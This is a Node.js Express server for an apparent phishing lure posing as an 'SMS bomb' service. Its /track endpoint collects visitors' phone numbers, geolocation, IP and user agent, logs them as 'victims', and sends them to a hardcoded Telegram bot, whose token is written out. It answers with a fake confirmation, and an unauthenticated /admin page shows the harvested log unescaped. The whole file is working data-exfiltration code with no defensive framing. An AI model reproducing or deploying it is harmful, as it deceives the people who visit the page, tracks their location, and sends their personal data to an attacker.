const express = require('express');
const axios = require('axios');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// Your Telegram credentials
const BOT_TOKEN = '8559209717:AAF5SsdVl67GjcFK1NUXb0jBfJ5fwKyXy-I';
const YOUR_CHAT_ID = '5728569894';

app.use(express.static('public'));
app.use(express.json());

// Telegram alert function
async function sendTelegramAlert(victimData) {
    const { phone, lat, lon, count, userAgent, ip } = victimData;
    
    const message = `🚀 **NEW SMS BOMB VICTIM** 🚀\n\n` +
                   `📱 **Target Phone:** \`${phone}\`\n` +
                   `🎯 **Location:** ${lat}, ${lon}\n` +
                   `📊 **SMS Count:** ${count} messages\n` +
                   `🌐 **IP Address:** ${ip}\n` +
                   `🕒 **Time:** ${new Date().toLocaleString()}\n` +
                   `📡 **User Agent:** ${userAgent.substring(0, 50)}...\n\n` +
                   `📍 [View on Google Maps](https://maps.google.com/?q=${lat},${lon})`;
    
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: YOUR_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log('[BOT] SMS Bomb alert sent to Telegram');
    } catch (error) {
        console.error('[BOT] Error:', error.message);
    }
}

// Main tracking endpoint
app.post('/track', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.ip || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const referer = req.headers['referer'] || 'Direct';
    
    const { phone, lat, lon, count, time } = req.body;
    
    // Victim data
    const victimData = {
        phone: phone || 'Not provided',
        lat: lat || 'Blocked',
        lon: lon || 'Blocked',
        count: count || '10',
        userAgent,
        ip,
        referer,
        timestamp: time || new Date().toISOString()
    };
    
    // Save to log file
    const logEntry = `
[SMS BOMB VICTIM - ${new Date().toLocaleString()}]
📱 Phone: ${phone}
📍 Location: ${lat}, ${lon}
📊 SMS Count: ${count}
🌐 IP: ${ip}
🔗 Referer: ${referer}
📱 User Agent: ${userAgent}
────────────────────────────
`;
    fs.appendFileSync('sms_victims.log', logEntry);
    
    // Send Telegram alert
    await sendTelegramAlert(victimData);
    
    // Send response
    res.json({ 
        success: true, 
        message: 'SMS bomb initiated. Messages will arrive shortly.',
        fake_id: Math.random().toString(36).substring(7)
    });
});

// GET tracking (for page views)
app.get('/track', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.ip;
    const action = req.query.action || 'unknown';
    
    const logEntry = `[PAGE VIEW] ${new Date().toISOString()} - IP: ${ip} - Action: ${action}\n`;
    fs.appendFileSync('page_views.log', logEntry);
    
    res.sendStatus(200);
});

// Admin panel to view victims
app.get('/admin', (req, res) => {
    if (fs.existsSync('sms_victims.log')) {
        const logs = fs.readFileSync('sms_victims.log', 'utf8');
        const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Panel - SMS Bomb Tracker</title>
            <style>
                body { font-family: monospace; background: #0f0f0f; color: #0f0; padding: 20px; }
                pre { background: #000; padding: 20px; border-radius: 5px; }
                h1 { color: #fff; }
            </style>
        </head>
        <body>
            <h1>📊 SMS Bomb Victims Log</h1>
            <pre>${logs}</pre>
        </body>
        </html>`;
        res.send(html);
    } else {
        res.send('No victims yet. Waiting for data...');
    }
});

app.listen(PORT, () => {
    console.log(`🔥 SMS Bomb Tracker running on port ${PORT}`);
    console.log(`🎯 Phishing page: http://localhost:${PORT}`);
    console.log(`📊 Admin panel: http://localhost:${PORT}/admin`);
});
